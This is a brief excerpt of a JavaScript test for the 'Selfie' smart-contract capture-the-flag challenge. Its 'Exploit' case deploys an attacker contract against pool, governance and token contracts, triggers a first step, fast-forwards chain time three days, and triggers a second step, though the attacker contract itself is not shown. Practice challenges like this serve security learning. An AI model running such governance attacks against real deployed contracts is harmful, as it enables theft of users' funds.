...
describe('[Challenge] Selfie', function () {
    ...
    it('Exploit', async function () {
        ...
        this.attacker = await AttackerContractFactory.deploy(this.pool.address, this.governance.address, this.token.address);

        await this.attacker.connect(attacker).execute1();

        await ethers.provider.send("evm_increaseTime", [3 * 24 * 60 * 60]);

        await this.attacker.connect(attacker).execute2();
    });
